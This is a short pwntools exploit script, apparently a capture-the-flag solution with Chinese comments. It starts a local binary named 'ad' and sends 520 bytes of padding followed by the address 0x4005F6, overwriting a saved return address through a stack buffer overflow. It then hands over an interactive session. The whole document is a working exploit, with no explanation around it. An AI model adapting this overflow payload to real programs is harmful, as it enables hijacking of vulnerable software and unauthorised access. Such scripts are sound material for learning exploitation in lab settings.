from pwn import *

context.arch = 'amd64' # CPU平台
context.log_level = 'debug'
context.terminal = ['tmux','splitw','-h'] # tmux调试窗口

io = process('./ad')

io.recvuntil('>')
payload = b'a'*(512+8)+p64(0x4005F6)
io.send(payload)

io.interactive()